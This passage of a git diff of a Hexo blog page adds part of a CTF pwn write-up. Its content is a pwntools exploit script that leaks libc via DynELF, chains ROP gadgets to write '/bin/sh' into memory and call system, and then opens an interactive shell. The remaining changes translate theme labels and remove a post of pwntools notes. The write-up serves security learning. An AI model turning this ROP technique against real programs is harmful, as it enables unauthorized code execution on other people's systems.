class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">binsh_addr = <span class="number">0x601000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">  payload = <span class="string">"a"</span> * <span class="number">0x48</span> + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">  payload = payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br><span class="line">  io.send(payload)</span><br><span class="line">  io.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line">  content = <span class="string">""</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    c = io.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'\n'</span> <span class="keyword">and</span> c == <span class="string">""</span>:</span><br><span class="line">        content = content[:<span class="number">-1</span>] + <span class="string">'\x00'</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        content += c</span><br><span class="line">        up = c</span><br><span class="line">  content = content[:<span class="number">4</span>]</span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (addr, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">  <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf = elf)</span><br><span class="line">sys_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">log.info(<span class="string">"system_addr =&gt; %#x"</span>, sys_addr)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">"a"</span> * <span class="number">0x48</span> + p64(rop1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">8</span>) + p64(binsh_addr) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(rop2)</span><br><span class="line">payload += <span class="string">"\x00"</span> * <span class="number">56</span>    <span class="comment">#rop2结束又跳转到rop1，需要再填充7 * 8字节到返回地址</span></span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">payload  = payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x48</span> + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/08/25/攻防世界-进阶/pwn100-flag.GIF" alt=""></p>
+<p><a href="https://www.jianshu.com/p/463d2fafb538" target="_blank" rel="noopener">https://www.jianshu.com/p/463d2fafb538</a><br><a href="https://blog.csdn.net/qq_41071646/article/details/86559557" target="_blank" rel="noopener">https://blog.csdn.net/qq_41071646/article/details/86559557</a></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/08/25/dice-game/"/>
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -391,7 +587,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Diposting di</span>
+                <span class="post-meta-item-text">Veröffentlicht am</span>
               
 
               
@@ -510,7 +706,7 @@
           <h1 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2019/08/17/攻防世界-新手/" class="post-title-link" itemprop="url">Tidak ada title</a>
+                <a href="/2019/08/17/攻防世界-新手/" class="post-title-link" itemprop="url">Unbenannt</a>
               
             
           </h1>
@@ -528,7 +724,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Diposting di</span>
+                <span class="post-meta-item-text">Veröffentlicht am</span>
               
 
               
@@ -1983,7 +2179,7 @@ exp：<br>
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Diposting di</span>
+                <span class="post-meta-item-text">Veröffentlicht am</span>
               
 
               
@@ -2021,7 +2217,7 @@ exp：<br>
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Di</span>
+                <span class="post-meta-item-text">in</span>
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -2222,7 +2418,7 @@ exp：<br>
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Diposting di</span>
+                <span class="post-meta-item-text">Veröffentlicht am</span>
               
 
               
@@ -2248,7 +2444,7 @@ exp：<br>
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Di</span>
+                <span class="post-meta-item-text">in</span>
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -2401,7 +2597,7 @@ exp：<br>
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Diposting di</span>
+                <span class="post-meta-item-text">Veröffentlicht am</span>
               
 
               
@@ -2565,7 +2761,7 @@ exp：<br>
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Diposting di</span>
+                <span class="post-meta-item-text">Veröffentlicht am</span>
               
 
               
@@ -2603,7 +2799,7 @@ exp：<br>
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Di</span>
+                <span class="post-meta-item-text">in</span>
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -2754,7 +2950,7 @@ exp：<br>
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Diposting di</span>
+                <span class="post-meta-item-text">Veröffentlicht am</span>
               
 
               
@@ -2792,7 +2988,7 @@ exp：<br>
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Di</span>
+                <span class="post-meta-item-text">in</span>
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -2934,7 +3130,7 @@ exp：<br>
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Diposting di</span>
+                <span class="post-meta-item-text">Veröffentlicht am</span>
               
 
               
@@ -2972,7 +3168,7 @@ exp：<br>
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Di</span>
+                <span class="post-meta-item-text">in</span>
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -3113,7 +3309,7 @@ exp：<br>
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Diposting di</span>
+                <span class="post-meta-item-text">Veröffentlicht am</span>
               
 
               
@@ -3151,7 +3347,7 @@ exp：<br>
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Di</span>
+                <span class="post-meta-item-text">in</span>
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -3240,207 +3436,6 @@ exp：<br>
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/05/01/pwntools/"/>
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh"/>
-      <meta itemprop="description" content=""/>
-      <meta itemprop="image" content="/images/avatar.gif"/>
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo"/>
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/05/01/pwntools/" class="post-title-link" itemprop="url">pwntools</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Diposting di</span>
-              
-
-              
-                
-              
-
-              <time title="Post created: 2019-05-01 21:06:57" itemprop="dateCreated datePublished" datetime="2019-05-01T21:06:57+08:00">2019-05-01</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Updated at: 2019-08-17 15:56:31" itemprop="dateModified" datetime="2019-08-17T15:56:31+08:00">2019-08-17</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Di</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>连接：本地process()、远程remote( , )；对于remote函数可以接url并且指定端口<br>数据处理：主要是对整数进行打包：p32、p64是打包为二进制，u32、u64是解包为二进制<br>IO模块：这个比较容易跟zio搞混，记住zio是read、write，pwn是recv、send</p>
-<pre><code>send(data): 发送数据
-sendline(data) : 发送一行数据，相当于在末尾加\n      
-recv(numb=4096, timeout=default) : 给出接收字节数,timeout指定超时
-recvuntil(delims, drop=False) : 接收到delims的pattern
-（以下可以看作until的特例）
-recvline(keepends=True) : 接收到\n，keepends指定保留\n
-recvall() : 接收到EOF
-recvrepeat(timeout=default) : 接收到EOF或timeout
-interactive() : 与shell交互
-</code></pre><p>ELF模块：获取基地址、获取函数地址（基于符号）、获取函数got地址、获取函数plt地址</p>
-<pre><code>e = ELF(&apos;/bin/cat&apos;)
-print hex(e.address)  # 文件装载的基地址
-0x400000
-print hex(e.symbols[&apos;write&apos;]) # 函数地址
-0x401680
-print hex(e.got[&apos;write&apos;]) # GOT表的地址
-0x60b070
-print hex(e.plt[&apos;write&apos;]) # PLT的地址
-0x401680
-</code></pre><p>解题常用：</p>
-<pre><code>context.arch = &apos;amd64&apos;   //设置架构
-context.log_level = &apos;debug&apos; //显示log详细信息
-libc = ELF(&apos;./libc-2.24.so&apos;)  //加载库文件
-</code></pre><hr>
-<p>作者：SueLyon<br>链接：<a href="https://www.jianshu.com/p/6e528b33e37a" target="_blank" rel="noopener">https://www.jianshu.com/p/6e528b33e37a</a></p>
-<hr>
-<p><a href="https://www.cnblogs.com/Ox9A82/p/5728149.html" target="_blank" rel="noopener">CTF常用python库PwnTools的使用学习</a>  这个博主不错</p>
-<p><a href="https://woaielf.github.io/2017/06/13/python3-all/#%E6%80%BB%E8%A7%88" target="_blank" rel="noopener">Python 编程核心知识体系</a><br><a href="http://brieflyx.me/2015/python-module/pwntools-intro/" target="_blank" rel="noopener">Exploit利器——Pwntools</a><br><a href="https://www.jianshu.com/p/d3187a63c582" target="_blank" rel="noopener">PwnTools常见用法</a><br><a href="https://blog.csdn.net/qq_29343201/article/details/51337025" target="_blank" rel="noopener">pwntools使用简介
-</a></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3488,8 +3483,8 @@ libc = ELF(&apos;./libc-2.24.so&apos;)  //加载库文件
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">86</span>
-                    <span class="site-state-item-name">posting</span>
+                    <span class="site-state-item-count">87</span>
+                    <span class="site-state-item-name">Artikel</span>
                   </a>
                 </div>
               
@@ -3523,8 +3518,10 @@ libc = ELF(&apos;./libc-2.24.so&apos;)  //加载库文件
                     
                       
                     
-                    <span class="site-state-item-count">11</span>
-                    <span class="site-state-item-name">kategori</span>
+                      
+                    
+                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-name">Kategorien</span>
                   </a>
                 </div>
               
@@ -3576,7 +3573,7 @@ libc = ELF(&apos;./libc-2.24.so&apos;)  //加载库文件
 </div>
 
 
-  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
 
 
 
@@ -3584,7 +3581,7 @@ libc = ELF(&apos;./libc-2.24.so&apos;)  //加载库文件
 
 
 
-  <div class="theme-info">Tema – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v6.7.0</div>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v6.7.0</div>
 
 
 
